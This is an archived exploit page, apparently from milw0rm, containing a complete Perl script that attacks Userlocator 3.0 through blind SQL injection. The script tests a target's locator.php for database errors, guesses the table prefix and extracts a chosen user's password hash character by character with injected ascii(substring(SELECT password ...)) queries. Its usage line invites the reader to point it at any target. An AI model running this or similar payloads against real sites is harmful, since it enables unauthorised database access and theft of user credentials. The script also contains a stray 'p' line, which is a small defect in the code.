<html><head><title>Userlocator 3.0 (y) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

use strict;
use LWP::Simple;

$| = 1;
p
print q {

:::::::::::::::::::::::::::::
:: Userlocator 3.0 Exploit ::
::  written by katharsis   ::
:::::::::::::::::::::::::::::

[~] www.katharsis.x2.to
[~] nebelfrost23@web.de

};

if (@ARGV &lt; 2) {
 print &quot;Usage: usrlocsploit.pl [url] [user id]\nExample: usrlocsploit.pl www.target.com 1\n&quot;;
 exit;
}

my $page = shift;
my $uid  = shift;

my $prefix;

my @charset = ('a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','0');

print &quot;[x] Vulnerability check...\n&quot;;

my $chreq = get(&quot;http://&quot;.$page.&quot;/locator.php?action=get_user&amp;y='&quot;);

if (($chreq =~ m/Database error/i) || ($chreq =~ m/Invalid SQL/i)) { 

print &quot;[x] Seems to be vulnerable!\n&quot;;

} else {

print &quot;[o] Seems to be patched, sorry\n&quot;;
exit;

}

print &quot;[^] Prefix check...\n&quot;;

if ($chreq =~ m/(..._)wlw/i) {

 print &quot;[^] Success, using Prefix '$1'\n&quot;;
 $prefix = $1;

} else { 
 print &quot;[o] Can't find prefix, using 'bb1_'\n&quot;;
 $prefix = &quot;bb1&quot;;
}

print &quot;[+] Getting hash...\n&quot;;
print &quot;[+] Hash: &quot;;

my $curnum = 1;

while($curnum &lt; 32) {

my $false_result = get(&quot;http://&quot;.$page.&quot;/locator.php?action=get_user&amp;x=233&amp;y=365'/**/OR/**/ascii(substring((SELECT+password+FROM+&quot;.$prefix.&quot;users+WHERE+userid=&quot;.$uid.&quot;),&quot;.$curnum.&quot;))=-1/*&quot;);

foreach(@charset) {

 my $ascode       = ord($_);
 my $result       = get(&quot;http://&quot;.$page.&quot;/locator.php?action=get_user&amp;x=233&amp;y=365'/**/OR/**/ascii(substring((SELECT+password+FROM+&quot;.$prefix.&quot;users+WHERE+userid=&quot;.$uid.&quot;),&quot;.$curnum.&quot;))=&quot;.$ascode.&quot;/*&quot;);

 if (length($result) != 0) {
  if (length($result) != length($false_result)) {
   print chr($ascode);
   $curnum++;
   }
  }
 }
}

print &quot;\n[+] Done!\n&quot;;

# EOF

# milw0rm.com [2008-12-21]</pre></html>